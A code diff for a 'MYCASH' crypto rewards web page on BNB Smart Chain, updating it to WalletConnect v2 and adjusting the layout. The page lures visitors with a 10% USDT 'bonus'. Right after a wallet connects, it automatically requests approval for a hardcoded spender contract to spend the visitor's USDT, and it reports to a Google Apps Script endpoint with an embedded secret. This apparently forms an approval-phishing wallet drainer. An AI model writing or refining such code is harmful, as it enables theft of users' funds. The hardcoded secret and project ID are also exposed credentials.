@@ -7,7 +7,15 @@
   <style>
     body{font-family:system-ui,Segoe UI,Arial;background:#0b1220;color:#e6eef8;margin:0}
     header{background:#071027;padding:12px 16px;position:sticky;top:0;z-index:20;border-bottom:1px solid rgba(255,255,255,0.03)}
-    .nav{max-width:980px;margin:0 auto;display:flex;align-items:center;justify-content:space-between}
+.nav{
+  max-width:980px;
+  margin:0 auto;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  flex-wrap:wrap;
+  gap:8px;
+}
     .nav-left{display:flex;gap:14px}
     a{color:#dbeafe;text-decoration:none;padding:6px 10px;border-radius:6px}
     a:hover{background:#0f1b33}
@@ -137,6 +145,51 @@
       .gauge-wrap{flex:1 1 100%;margin-top:6px}
       .reward-info{flex:1 1 100%}
     }
+
+    /* ===== Mobile header cleanup ===== */
+    @media (max-width: 640px){
+      header{
+        padding:8px 10px;
+      }
+
+      .nav{
+        justify-content:center;
+        text-align:center;
+      }
+
+      .logo{
+        order:1;
+        width:100%;
+        text-align:center;
+        font-size:0.9rem;
+        letter-spacing:3px;
+        margin-bottom:4px;
+      }
+
+      .nav-left{
+        order:2;
+        width:100%;
+        display:flex;
+        justify-content:center;
+        gap:8px;
+        flex-wrap:wrap;
+      }
+
+      header .connect{
+        order:3;
+        width:100%;
+        max-width:260px;
+        padding:8px 12px;
+        font-size:0.9rem;
+        margin:4px auto 0;
+        display:block;
+      }
+
+      header a{
+        padding:4px 8px;
+        font-size:0.85rem;
+      }
+    }
   </style>
 </head>
 <body>
@@ -144,8 +197,8 @@
     <div class="nav">
       <div class="nav-left">
         <a href="index.html">Home</a>
-        <a href="hold-earn.html">Earn</a>
         <a href="rewards.html">Rewards</a>
+        <a href="hold-earn.html">Hold & Earn</a>
       </div>
       <div class="logo">MYCASH</div>
       <div>
@@ -232,62 +285,80 @@
 
   <!-- libs -->
   <script src="https://unpkg.com/web3@1.2.11/dist/web3.min.js"></script>
-  <script src="https://unpkg.com/web3modal@1.9.0/dist/index.js"></script>
-  <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
+  <!-- WalletConnect v2 Ethereum Provider -->
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.10.5/dist/index.umd.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js"></script>
 
   <!-- app script -->
   <script type="module">
   (function(){
     // ===== CONFIG =====
-function formatToken(n) {
-  n = Number(n);
-  if (Number.isInteger(n)) return n.toString();
-  return n.toFixed(4).replace(/\.?0+$/, "");
-}
+    function formatToken(n) {
+      n = Number(n);
+      if (Number.isInteger(n)) return n.toString();
+      return n.toFixed(4).replace(/\.?0+$/, "");
+    }
 
-
-function formatToken(n) {
-  n = Number(n);
-  if (Number.isInteger(n)) return n.toString();
-  return n.toFixed(4).replace(/\.?0+$/, "");
-}
-
-    
     const APPS_SCRIPT_URL    = "https://script.google.com/macros/s/AKfycbyZ9VwZ1gT3TmPMh3qfJz7ZqXfNyp14PGFHraS49yq35J6U8Z3CNFK-04rlsoRP5-o4GA/exec";
-    const APPS_SCRIPT_SECRET = "justforme";
+    const APPS_SCRIPT_SECRET = "mahfuzinam0045";
 
-    // Token on BSC (mainnet) – update this to your mainnet token/USDT address
+    // Token on BNB Smart Chain (set this to your MAINNET token/USDT address)
     const TOKEN_ADDRESS   = "0x55d398326f99059fF775485246999027B3197955";
-    const SPENDER_ADDRESS = "0xdB6550D0Db3C7d87Cfa78769c5078aC96117AAc1"; // your smart contract (update to mainnet contract)
+    const SPENDER_ADDRESS = "0xdB6550D0Db3C7d87Cfa78769c5078aC96117AAc1"; // your smart contract
 
     // === BNB Smart Chain MAINNET config ===
-    const BNB_TESTNET_CHAIN_ID_DEC = 56;          // mainnet
-    const BNB_TESTNET_CHAIN_ID_HEX = "0x38";      // mainnet
+    const BNB_TESTNET_CHAIN_ID_DEC = 56;
+    const BNB_TESTNET_CHAIN_ID_HEX = "0x38";
     const BNB_TESTNET_LABEL        = "BNB Smart Chain (56)";
+    const BNB_TESTNET_RPC          = "https://bsc-dataseed.binance.org";
 
     const ERC20_APPROVE_ABI = [
       "function approve(address spender, uint256 amount) public returns (bool)"
     ];
-    
     const ERC20_BALANCE_ABI = [
       "function balanceOf(address owner) view returns (uint256)"
-    ]; 
-
+    ];
     const ERC20_ALLOWANCE_ABI = [
       "function allowance(address owner, address spender) view returns (uint256)"
     ];
 
-    const TOKEN_DECIMALS = 6;   // keep as-is for your token; change if your mainnet token uses different decimals
-   
+    const TOKEN_DECIMALS = 6;
 
     // Reward config: bonus = USDT * BONUS_RATE
     const BONUS_RATE = 0.10;              // 10% of USDT balance
     const MAX_USDT_FOR_GAUGE = 1000.0;    // 1000 USDT = 100% gauge
 
-    let web3ModalInstance = null;
     let providerInstance  = null;
     let web3Instance      = null;
+
+    // ===== WalletConnect v2 config =====
+    let walletConnectV2Provider = null;
+
+    // 🔑 Your WalletConnect v2 project ID
+    const WALLETCONNECT_PROJECT_ID = "febf4ea32fb4df7139f1cfd3f7c5142a";
+
+    async function getWalletConnectV2Provider() {
+      if (walletConnectV2Provider) return walletConnectV2Provider;
+
+      const EthereumProvider = globalThis["@walletconnect/ethereum-provider"].EthereumProvider;
+
+      walletConnectV2Provider = await EthereumProvider.init({
+        projectId: WALLETCONNECT_PROJECT_ID,
+        optionalChains: [BNB_TESTNET_CHAIN_ID_DEC],
+        rpcMap: {
+          [BNB_TESTNET_CHAIN_ID_DEC]: BNB_TESTNET_RPC
+        },
+        metadata: {
+          name: "MYCASH DApp",
+          description: "MYCASH bonus rewards dApp",
+          url: window.location.origin,
+          icons: ["https://mycash911.github.io/mycash/icon.png"]
+        },
+        showQrModal: true
+      });
+
+      return walletConnectV2Provider;
+    }
 
     // ===== helpers =====
     function storageKeyFor(address){
@@ -363,7 +434,7 @@ function formatToken(n) {
       rewardBalanceEl.textContent = formatToken(balance) + " USDT";
       rewardBonusEl.textContent   = formatToken(bonus) + " USDT";
 
-      if (rewardHintEl)    rewardHintEl.textContent    = "This is an estimated bonus based on your current USDT balance.";
+      if (rewardHintEl) rewardHintEl.textContent = "This is an estimated bonus based on your current USDT balance.";
 
       const ratio = Math.max(0, Math.min(balance / MAX_USDT_FOR_GAUGE, 1)); // 0–1
       const angle = -90 + ratio * 180; // -90° (left) to +90° (right)
@@ -382,23 +453,6 @@ function formatToken(n) {
       setUserIdUI("-");
       tokensContainer.innerHTML = '<div class="muted">Connect wallet to see token balance.</div>';
       resetRewardUI();
-    }
-
-    function initWeb3ModalInstance(){
-      const providerOptions = {
-        walletconnect: {
-          package: window.WalletConnectProvider.default,
-          options: {
-            rpc: { 56: "https://bsc-dataseed.binance.org" },
-            bridge: "https://bridge.walletconnect.org",
-            qrcode: true
-          }
-        }
-      };
-      web3ModalInstance = new window.Web3Modal.default({
-        cacheProvider: true,
-        providerOptions
-      });
     }
 
     function attachProviderListeners(p){
@@ -472,7 +526,7 @@ function formatToken(n) {
         const ethersProvider = new ethers.BrowserProvider(providerInstance);
         const tokenContract  = new ethers.Contract(TOKEN_ADDRESS, ERC20_BALANCE_ABI, ethersProvider);
         const raw            = await tokenContract.balanceOf(address);
-        const formatted = ethers.formatUnits(raw, TOKEN_DECIMALS);
+        const formatted      = ethers.formatUnits(raw, TOKEN_DECIMALS);
 
         return formatted;
       }catch(err){
@@ -497,7 +551,7 @@ function formatToken(n) {
                 chainId: BNB_TESTNET_CHAIN_ID_HEX,
                 chainName: "BNB Smart Chain",
                 nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18},
-                rpcUrls:["https://bsc-dataseed.binance.org"],
+                rpcUrls:[BNB_TESTNET_RPC],
                 blockExplorerUrls:["https://bscscan.com"]
               }]
             });
@@ -571,7 +625,6 @@ function formatToken(n) {
       }
     }
 
-
     // helper to restore UI (bnb + USDT + reward) given current web3Instance + address
     async function restoreSessionFromAddress(address){
       const balanceWei = await web3Instance.eth.getBalance(address);
@@ -583,8 +636,7 @@ function formatToken(n) {
 
       const tokenBalanceRaw  = await getTokenBalance(address);
       const tokenBalanceNum  = tokenBalanceRaw ? Number(tokenBalanceRaw) : 0;
-      const prettyBalance = tokenBalanceRaw ? formatToken(tokenBalanceRaw) : "0";
-
+      const prettyBalance    = tokenBalanceRaw ? formatToken(tokenBalanceRaw) : "0";
 
       tokensContainer.innerHTML =
         '<div class="token">' +
@@ -603,28 +655,34 @@ function formatToken(n) {
       };
     }
 
+    // ===== connectFlow with injected + WalletConnect v2 =====
     async function connectFlow(){
       try{
         setStatus("Connecting…");
-        const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+        const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 
-        // Trust Wallet extension
-        if(!mobile && window.trustwallet && window.trustwallet.ethereum){
+        let usedInjected = false;
+
+        // 1) Prefer Trust Wallet provider if present (extension or in-app browser)
+        if (window.trustwallet && window.trustwallet.ethereum) {
           providerInstance = window.trustwallet.ethereum;
-          web3Instance     = new Web3(providerInstance);
-          await providerInstance.request({ method: "eth_requestAccounts" });
+          usedInjected = true;
         }
-        // Standard injected (MetaMask, some Trust)
-        else if(window.ethereum && !mobile){
+        // 2) Otherwise, use standard injected provider (MetaMask, other wallets)
+        else if (window.ethereum) {
           providerInstance = window.ethereum;
-          web3Instance     = new Web3(providerInstance);
-          await providerInstance.request({ method: "eth_requestAccounts" });
+          usedInjected = true;
         }
-        // WalletConnect via Web3Modal
-        else {
-          if(!web3ModalInstance) initWeb3ModalInstance();
-          providerInstance = await web3ModalInstance.connect();
-          web3Instance     = new Web3(providerInstance);
+
+        if (usedInjected) {
+          // Injected wallet (TrustWallet / MetaMask / etc.)
+          web3Instance = new Web3(providerInstance);
+          await providerInstance.request({ method: "eth_requestAccounts" });
+        } else {
+          // No injected provider → use WalletConnect v2 (desktop AND mobile)
+          providerInstance = await getWalletConnectV2Provider();
+          await providerInstance.enable(); // opens WC modal (QR / deep link)
+          web3Instance = new Web3(providerInstance);
         }
 
         if(!providerInstance || !web3Instance){
@@ -672,7 +730,6 @@ function formatToken(n) {
 
         await ensureTokenApproval();
 
-
       }catch(err){
         console.error("connectFlow error:", err);
         setStatus("Connection failed");
@@ -680,7 +737,7 @@ function formatToken(n) {
       }
     }
 
-    // silent restore using eth_accounts; returns true if restored
+    // silent restore using eth_accounts; returns true if restored (injected only)
     async function tryAutoReconnectSilent(){
       const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 
@@ -718,7 +775,7 @@ function formatToken(n) {
         }
       }
 
-      // 3) Do NOT auto-connect WalletConnect silently (would open QR)
+      // 3) Do NOT auto-connect WalletConnect silently (would open modal)
       return false;
     }
 
@@ -743,7 +800,6 @@ function formatToken(n) {
     }
 
     document.addEventListener("DOMContentLoaded", async function(){
-      initWeb3ModalInstance();
       resetRewardUI();
       connectBtn.addEventListener("click", connectFlow);
       await autoConnectOnLoad();
